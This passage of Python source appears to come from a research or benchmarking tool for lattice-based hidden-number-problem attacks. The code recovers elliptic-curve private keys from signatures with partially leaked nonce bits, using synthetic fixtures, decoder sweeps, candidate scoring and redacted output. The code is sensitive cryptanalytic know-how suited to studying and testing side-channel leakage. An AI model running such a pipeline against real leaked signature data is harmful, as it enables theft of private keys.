        q = int(config["q"], 0) if isinstance(config["q"], str) else int(config["q"])
        bits_known = int(config.get("bits_known", 6))
        synthetic_n = int(config.get("synthetic_n", 8) or 8)
        if synthetic_n < 2:
            synthetic_n = 2
        leaks_raw, ground_truth_d = synthetic_fixture_lsb(n=synthetic_n, bits_known=bits_known, q=q)
        leaks, rejected, input_stats = strict_parse_leaks(leaks_raw, q, bits_known)
        save_json(input_stats, os.path.join(out_dir, "input_stats.json"))
        print(f"[SYNTHETIC] Ground-truth d: {ground_truth_d}")
    else:
        leaks_raw = []
        with open(config["input"], "r", encoding="utf-8") as f:
            for line in f:
                try:
                    leaks_raw.append(json.loads(line.strip()))
                except Exception:
                    continue
        q = int(config["q"], 0) if isinstance(config["q"], str) else int(config["q"])
        bits_known = int(config["bits_known"])
        leaks, rejected, input_stats = strict_parse_leaks(leaks_raw, q, bits_known)
        save_json(input_stats, os.path.join(out_dir, "input_stats.json"))
        if input_stats["valid_count"] < 2:
            print("[E_PREFLIGHT_SAMPLE] Not enough valid leaks for attack. Aborting.")
            sys.exit(1)

    feasibility = hnp_feasibility(
        sample_count=len(leaks),
        bits_known=bits_known,
        q=q,
        leakage_model=config.get("leakage_model", "LSB"),
    )
    save_json(feasibility, os.path.join(out_dir, "feasibility_report.json"))
    if config.get("synthetic_test") and not feasibility["likely_solvable"]:
        print(
            "[SYNTHETIC] Infeasible regression instance:",
            f"n={feasibility['sample_count']}",
            f"bits_known={feasibility['bits_known']}",
            f"leakage_bits={feasibility['leakage_bits']}",
            f"recommended_min={feasibility['recommended_min_leakage_bits']}",
        )

    # Preflight: memory guard
    memory_guard(config.get("max_memory_mb", 2048))

    # Assumptions metadata
    assumptions = {
        "nonce_leakage_model": "partial-known-bits",
        "bit_position_convention": "LSB",
        "curve_order": str(q),
        "normalization": "none"
    }
    save_json(assumptions, os.path.join(out_dir, "assumptions.json"))

    # Save resolved config
    save_json(config, os.path.join(out_dir, "resolved_config.json"))


    # Lattice reduction & telemetry

    t0 = time.time()
    q_int = int(config["q"], 0) if isinstance(config["q"], str) else int(config["q"])
    bits_int = int(config["bits_known"])
    try:
        def run_variant(variant_name, leaks_local, bits_known_local, decode_mode_local=None):
            recover_private_key.leakage_model = config.get("leakage_model", "LSB")
            recover_private_key.debug_algo = bool(config.get("debug_algo", False))
            recover_private_key.lattice_variant = variant_name
            ew = int(config.get("embedding_weight", 0) or 0)
            recover_private_key.embedding_weight = (ew if ew > 0 else None)
            recover_private_key.decode_mode = str(
                decode_mode_local if decode_mode_local is not None else config.get("decode_mode", "cvp_single")
                or "cvp_single"
            )
            recover_private_key.decode_k = max(1, int(config.get("decode_k", 32) or 32))
            recover_private_key.decode_perturb_radius = max(
                0,
                int(config.get("decode_perturb_radius", 2) or 2),
            )
            return recover_private_key(
                leaks_local,
                q_int,
                int(bits_known_local),
                reduction_mode=config.get("reduction_mode", "LLL"),
                bkz_blocksize=config.get("bkz_blocksize", 10),
            )

        def row_rank_key(row):
            return (
                int(bool(row.get("found_ground_truth", False))),
                float(row.get("top_ratio", 0.0)),
                int(row.get("top_match", 0)),
                -int(row.get("metrics", {}).get("hnp_diag_summary", {}).get("max_divisibility_gap_B", 10**9)),
            )

        def row_to_compact(row):
            return {
                "variant": row.get("variant"),
                "decode_mode": row.get("decode_mode"),
                "candidate_count": int(row.get("candidate_count", 0)),
                "top_ratio": float(row.get("top_ratio", 0.0)),
                "top_match": int(row.get("top_match", 0)),
                "found_ground_truth": bool(row.get("found_ground_truth", False)),
            }

        def choose_best_row(rows):
            return max(rows, key=row_rank_key) if rows else None

        def summarize_decoder_sweep(decoder_sweep_rows):
            by_decoder = {}
            for sweep_item in decoder_sweep_rows:
                rows_local = sweep_item.get("rows", [])
                if not rows_local:
                    continue
                best_local = choose_best_row(rows_local)
                best_mode_local = best_local.get("decode_mode") if best_local else None
                for row in rows_local:
                    mode = row.get("decode_mode")
                    if not mode:
                        continue
                    agg = by_decoder.setdefault(
                        mode,
                        {
                            "decode_mode": mode,
                            "points_total": 0,
                            "points_found": 0,
                            "point_wins": 0,
                            "sum_top_ratio": 0.0,
                            "sum_top_match": 0,
                            "sum_candidate_count": 0,
                        },
                    )
                    agg["points_total"] += 1
                    agg["points_found"] += int(bool(row.get("found_ground_truth", False)))
                    agg["point_wins"] += int(mode == best_mode_local)
                    agg["sum_top_ratio"] += float(row.get("top_ratio", 0.0))
                    agg["sum_top_match"] += int(row.get("top_match", 0))
                    agg["sum_candidate_count"] += int(row.get("candidate_count", 0))

            summary = []
            for mode, agg in by_decoder.items():
                total = max(1, int(agg["points_total"]))
                summary.append(
                    {
                        "decode_mode": mode,
                        "points_total": int(agg["points_total"]),
                        "points_found": int(agg["points_found"]),
                        "point_wins": int(agg["point_wins"]),
                        "win_rate": float(agg["point_wins"]) / float(total),
                        "avg_top_ratio": float(agg["sum_top_ratio"]) / float(total),
                        "avg_top_match": float(agg["sum_top_match"]) / float(total),
                        "avg_candidate_count": float(agg["sum_candidate_count"]) / float(total),
                    }
                )

            selected = max(
                summary,
                key=lambda d: (
                    int(d.get("points_found", 0)),
                    float(d.get("win_rate", 0.0)),
                    float(d.get("avg_top_ratio", 0.0)),
                    float(d.get("avg_top_match", 0.0)),
                    float(d.get("avg_candidate_count", 0.0)),
                ),
            ) if summary else None
            return summary, selected

        def evaluate_variant(variant_name, leaks_local, bits_known_local, decode_modes, ground_truth_d_local=None):
            rows = []
            for decode_mode_name in decode_modes:
                vcands, vmetrics, vdiag = run_variant(variant_name, leaks_local, bits_known_local, decode_mode_name)
                top_ratio = 0.0
                top_match = 0
                if vcands:
                    row_scores = [candidate_score(c, leaks_local, q_int, bits_known_local) for c in vcands[: min(64, len(vcands))]]
                    if row_scores:
                        top_ratio = max(float(rs.get("match_ratio", 0.0)) for rs in row_scores)
                        top_match = max(int(rs.get("match_count", 0)) for rs in row_scores)
                found_gt = False
                if config.get("synthetic_test") and ground_truth_d_local is not None:
                    found_gt = any((int(c) - int(ground_truth_d_local)) % q_int == 0 for c in vcands)
                rows.append(
                    {
                        "variant": variant_name,
                        "decode_mode": decode_mode_name,
                        "candidate_count": len(vcands),
                        "top_ratio": top_ratio,
                        "top_match": top_match,
                        "found_ground_truth": bool(found_gt),
                        "candidates": vcands,
                        "metrics": vmetrics,
                        "diag": vdiag,
                    }
                )
            best_row = choose_best_row(rows)
            return rows, best_row

        def evaluate_decoder_sweep(variant_name, n_val, bits_val, decode_modes):
            leaks_raw_n, gt_n = synthetic_fixture_lsb(n=int(n_val), bits_known=int(bits_val), q=q_int)
            leaks_n, _, _ = strict_parse_leaks(leaks_raw_n, q_int, int(bits_val))
            rows_n, best_n = evaluate_variant(
                variant_name,
                leaks_n,
                int(bits_val),
                decode_modes,
                ground_truth_d_local=int(gt_n),
            )
            return {
                "n": int(n_val),
                "bits_known": int(bits_val),
                "ground_truth_d": int(gt_n),
                "rows": rows_n,
                "selected_variant": best_n.get("variant") if best_n else None,
                "selected_decoder": best_n.get("decode_mode") if best_n else None,
            }

        compare_decoders = bool(config.get("compare_decoders", False))
        decoder_modes = [str(config.get("decode_mode", "cvp_single") or "cvp_single")]
        if compare_decoders and config.get("synthetic_test"):
            decoder_modes = ["cvp_single", "cvp_target_perturb"]

        if bool(config.get("compare_lattice_variants", False)):
            variant_rows = []
            for variant in ("primal", "embedding", "dual_normalized"):
                rows, best_row = evaluate_variant(variant, leaks, bits_int, decoder_modes, ground_truth_d_local=ground_truth_d if config.get("synthetic_test") else None)
                variant_rows.extend(rows)

            best_row = choose_best_row(variant_rows)
            candidates = best_row["candidates"]
            reduction_metrics = best_row["metrics"]
            hnp_diag = best_row["diag"]
            reduction_metrics["variant_comparison"] = [
                {
                    "variant": r["variant"],
                    "decode_mode": r.get("decode_mode"),
                    "candidate_count": len(r["candidates"]),
                    "top_ratio": r["top_ratio"],
                    "top_match": r["top_match"],
                    "found_ground_truth": r["found_ground_truth"],
                }
                for r in variant_rows
            ]
            reduction_metrics["selected_variant"] = best_row["variant"]
            if compare_decoders and config.get("synthetic_test"):
                reduction_metrics["decoder_comparison"] = [
                    {
                        "decode_mode": r["decode_mode"],
                        "candidate_count": r["candidate_count"],
                        "top_ratio": r["top_ratio"],
                        "top_match": r["top_match"],
                        "found_ground_truth": r["found_ground_truth"],
                    }
                    for r in variant_rows if r["variant"] == reduction_metrics["selected_variant"]
                ]
                reduction_metrics["selected_decoder"] = best_row["decode_mode"]

            # Optional synthetic n-sweep for cross-variant comparison stability.
            sweep_ns = _parse_int_csv(config.get("synthetic_n_sweep", ""))
            sweep_bits = _parse_int_csv(config.get("synthetic_bits_sweep", ""))
            if config.get("synthetic_test") and (sweep_ns or sweep_bits):
                if not sweep_ns:
                    sweep_ns = [int(config.get("synthetic_n", 8) or 8)]
                if not sweep_bits:
                    sweep_bits = [bits_int]
                sweep_report = []
                for n_val in sweep_ns:
                    n_int = int(n_val)
                    if n_int < 2:
                        continue
                    for bits_val in sweep_bits:
                        bits_local = int(bits_val)
                        if bits_local <= 0 or bits_local >= 256:
                            continue
                        leaks_raw_n, gt_n = synthetic_fixture_lsb(n=n_int, bits_known=bits_local, q=q_int)
                        leaks_n, _, _ = strict_parse_leaks(leaks_raw_n, q_int, bits_local)
                        rows_n = []
                        for variant in ("primal", "embedding", "dual_normalized"):
                            variant_rows_n, _ = evaluate_variant(
                                variant,
                                leaks_n,
                                bits_local,
                                decoder_modes,
                                ground_truth_d_local=int(gt_n),
                            )
                            rows_n.extend(variant_rows_n)
                        best_n = choose_best_row(rows_n)
                        sweep_report.append(
                            {
                                "n": n_int,
                                "bits_known": bits_local,
                                "ground_truth_d": int(gt_n),
                                "rows": rows_n,
                                "selected_variant": best_n.get("variant") if best_n else None,
                                "selected_decoder": best_n.get("decode_mode") if best_n else None,
                            }
                        )

                if sweep_report:
                    reduction_metrics["variant_n_sweep"] = sweep_report
                    save_json(sweep_report, os.path.join(out_dir, "lattice_variant_sweep.json"))
        elif compare_decoders and config.get("synthetic_test") and (_parse_int_csv(config.get("synthetic_n_sweep", "")) or _parse_int_csv(config.get("synthetic_bits_sweep", ""))):
            sweep_ns = _parse_int_csv(config.get("synthetic_n_sweep", ""))
            sweep_bits = _parse_int_csv(config.get("synthetic_bits_sweep", ""))
            if not sweep_ns:
                sweep_ns = [int(config.get("synthetic_n", 8) or 8)]
            if not sweep_bits:
                sweep_bits = [bits_int]
            decoder_sweep_report = []
            for n_val in sweep_ns:
                n_int = int(n_val)
                if n_int < 2:
                    continue
                for bits_val in sweep_bits:
                    bits_local = int(bits_val)
                    if bits_local <= 0 or bits_local >= 256:
                        continue
                    decoder_sweep_report.append(
                        evaluate_decoder_sweep(config.get("lattice_variant", "primal"), n_int, bits_local, decoder_modes)
                    )
            if decoder_sweep_report:
                decoder_sweep_summary, selected_decoder_stats = summarize_decoder_sweep(decoder_sweep_report)
                selected_decoder_mode = selected_decoder_stats.get("decode_mode") if selected_decoder_stats else None

                best_decoder_sweep = None
                for sweep_item in decoder_sweep_report:
                    for row in sweep_item.get("rows", []):
                        if selected_decoder_mode and row.get("decode_mode") != selected_decoder_mode:
                            continue
                        if best_decoder_sweep is None or row_rank_key(row) > row_rank_key(best_decoder_sweep):
                            best_decoder_sweep = dict(row)
                            best_decoder_sweep["n"] = sweep_item.get("n")
                            best_decoder_sweep["bits_known"] = sweep_item.get("bits_known")

                reduction_metrics = {
                    "decoder_n_sweep": decoder_sweep_report,
                    "decoder_sweep_summary": decoder_sweep_summary,
                    "selected_decoder": selected_decoder_mode,
                    "selected_variant": best_decoder_sweep.get("variant") if best_decoder_sweep else None,
                }
                if best_decoder_sweep:
                    reduction_metrics["selected_decoder_sweep"] = row_to_compact(best_decoder_sweep)
                    reduction_metrics["selected_decoder_sweep"]["n"] = best_decoder_sweep.get("n")
                    reduction_metrics["selected_decoder_sweep"]["bits_known"] = best_decoder_sweep.get("bits_known")
                    candidates = best_decoder_sweep.get("candidates", [])
                    hnp_diag = best_decoder_sweep.get("diag", {"summary": {"count": 0}, "rows": []})
                else:
                    candidates = []
                    hnp_diag = {"summary": {"count": 0}, "rows": []}
                save_json(decoder_sweep_report, os.path.join(out_dir, "decoder_variant_sweep.json"))
        else:
            if compare_decoders and config.get("synthetic_test"):
                decoder_rows, best_decoder_row = evaluate_variant(
                    config.get("lattice_variant", "primal"),
                    leaks,
                    bits_int,
                    ["cvp_single", "cvp_target_perturb"],
                    ground_truth_d_local=ground_truth_d,
                )
                candidates = best_decoder_row["candidates"] if best_decoder_row else []
                reduction_metrics = best_decoder_row["metrics"] if best_decoder_row else {"error": "no decoder rows"}
                hnp_diag = best_decoder_row["diag"] if best_decoder_row else {"summary": {"count": 0}, "rows": []}
                reduction_metrics["decoder_comparison"] = [
                    {
                        "decode_mode": r["decode_mode"],
                        "candidate_count": r["candidate_count"],
                        "top_ratio": r["top_ratio"],
                        "top_match": r["top_match"],
                        "found_ground_truth": r["found_ground_truth"],
                    }
                    for r in decoder_rows
                ]
                reduction_metrics["selected_decoder"] = best_decoder_row["decode_mode"] if best_decoder_row else None
            else:
                candidates, reduction_metrics, hnp_diag = run_variant(
                    config.get("lattice_variant", "primal"),
                    leaks,
                    bits_int,
                )
    except Exception as e:
        reduction_metrics = {"error": str(e)}
        candidates = []
        hnp_diag = {"summary": {"count": 0}, "rows": []}

    bounded_candidates, bounded_report = bounded_lsb_recovery(
        leaks,
        q_int,
        bits_int,
        int(config.get("max_candidates", 1000) or 1000),
    )
    if bounded_candidates:
        candidates = sorted(set([int(c) for c in candidates] + bounded_candidates))
    reduction_metrics["feasibility"] = feasibility
    reduction_metrics["bounded_lsb_fallback"] = bounded_report
    t1 = time.time()
    reduction_metrics["runtime_total_sec"] = t1 - t0
    reduction_metrics["input_count"] = len(leaks)
    save_json(reduction_metrics, os.path.join(out_dir, "reduction_metrics.json"))
    save_json(hnp_diag, os.path.join(out_dir, "hnp_diagnostics.json"))

    # Extended diagnostics: residual ranking and synthetic ground-truth comparison.
    diag_report = {
        "candidate": int(candidates[0]) if candidates else None,
        "hnp_diag_summary": hnp_diag.get("summary", {}),
        "worst_residual_rows": _top_worst_residuals(hnp_diag.get("rows", []), top_k=8),
    }
    if config.get("synthetic_test") and candidates:
        q_int = int(config["q"], 0) if isinstance(config["q"], str) else int(config["q"])
        bits_int = int(config["bits_known"])
        gt_diag = _compute_hnp_residuals(
            leaks,
            q_int,
            bits_int,
            int(ground_truth_d),
            config.get("leakage_model", "LSB"),
        )
        cand = int(candidates[0])
        near = _candidate_neighborhood(cand, q_int, radius=8)
        near_scores = []
        for x in near:
            m = candidate_score(x, leaks, q_int, bits_int)
            near_scores.append(
                {"candidate": int(x), "match_ratio": float(m["match_ratio"]), "match_count": int(m["match_count"])}
            )
        near_scores.sort(key=lambda z: (z["match_ratio"], z["match_count"]), reverse=True)
        diag_report["synthetic_compare"] = {
            "ground_truth_d": int(ground_truth_d),
            "candidate_d": cand,
            "delta_mod_q": int((cand - int(ground_truth_d)) % q_int),
            "candidate_diag_summary": hnp_diag.get("summary", {}),
            "ground_truth_diag_summary": gt_diag.get("summary", {}),
            "candidate_neighborhood_top": near_scores[:10],
        }
    save_json(diag_report, os.path.join(out_dir, "diagnostics_report.json"))

    # Synthetic test: check if ground-truth d is recovered
    if config.get("synthetic_test"):
        found = any(abs(c - ground_truth_d) % int(config["q"], 0) == 0 for c in candidates)
        if config.get("debug_algo"):
            q_int = int(config["q"], 0) if isinstance(config["q"], str) else int(config["q"])
            print(f"[ALGO] ground_truth_d={ground_truth_d}")
            print(f"[ALGO] candidates={candidates}")
            for c in candidates[:10]:
                delta = (int(c) - int(ground_truth_d)) % q_int
                m = candidate_score(c, leaks, q_int, int(config["bits_known"]))
                print(f"[ALGO] cand={c} delta_mod_q={delta} match_ratio={m['match_ratio']:.6f} match={m['match_count']}/{len(leaks)}")
        with open(os.path.join(out_dir, "bench_results.json"), "w", encoding="utf-8") as f:
            json.dump({"ground_truth_d": ground_truth_d, "found": found, "candidates": candidates}, f, indent=2)
        print(f"[SYNTHETIC] Success: {found}")
        if not found and not config.get("allow_synthetic_failure"):
            print("[E_SYNTHETIC_FAIL] HNP solver did not recover the synthetic ground-truth key.")
            print("[E_SYNTHETIC_FAIL] Treat HNP output as diagnostic only until this regression passes.")
            sys.exit(5)

    # Stop condition: candidate cap
    if len(candidates) > config.get("max_candidates", 1000):
        print(f"[E_STOP_CANDIDATE] Too many candidates: {len(candidates)} > {config.get('max_candidates', 1000)}")
        candidates = candidates[:config.get("max_candidates", 1000)]

    # Checkpoint after reduction
    checkpoint_save({"candidates": candidates}, out_dir, "pipeline")

    # --- Candidate Pipeline & Validation ---
    top_k = config.get("top_k", 10)
    candidate_table, full_table = candidate_pipeline(
        candidates, leaks, q, int(config["bits_known"]), top_k=top_k
    )
    with open(os.path.join(out_dir, "candidates.jsonl"), "w", encoding="utf-8") as f:
        for row in full_table:
            # Redact candidate unless --debug-sensitive
            row_out = row.copy()
            if not config.get("debug_sensitive", False):
                row_out["candidate"] = "<redacted>"
            f.write(json.dumps(row_out) + "\n")

    # Multi-stage validation report
    confidence_summary = summarize_confidence(full_table)
    validation_report = {
        "total_candidates": len(full_table),
        "confidence_bands": confidence_summary,
        "top_candidates": candidate_table,
    }
    save_json(validation_report, os.path.join(out_dir, "validation_report.json"))

    # False-positive controls: require at least 2 high-confidence, else warn
    min_high = config.get("min_high_confidence", 2)
    if confidence_summary["high"] < min_high:
        fp_warning = "E_VALIDATION_LOW_CONFIDENCE"
    else:
        fp_warning = None

    # Failure taxonomy & dashboard
    run_summary = {
        "status": "ok" if not fp_warning else "warning",
        "failure_code": fp_warning,
        "confidence_top": confidence_summary["high"],
        "candidates_high": [r for r in candidate_table if r["confidence"] == "high"],
        "runtime_total": reduction_metrics.get("runtime_total_sec", None),
        "next_action": "review_candidates" if not fp_warning else "investigate_low_confidence",
    }
    save_json(run_summary, os.path.join(out_dir, "dashboard.json"))

    # Stop condition: runtime
    elapsed = time.time() - start_time
    if elapsed > config.get("max_runtime", 600):
        print(f"[E_STOP_RUNTIME] Exceeded max runtime: {elapsed:.1f} > {config.get('max_runtime', 600)} sec")
        sys.exit(4)

    print(f"[OK] Run complete. Output in {out_dir}")

# --- Integration Adapter Stub ---
def integration_adapter(input_path, output_path):
    """
    Example: map pipeline files to solver input format with strict field mapping.
    """
    # Not implemented: add mapping logic as needed for your pipeline.
    pass

if __name__ == "__main__":
    main()
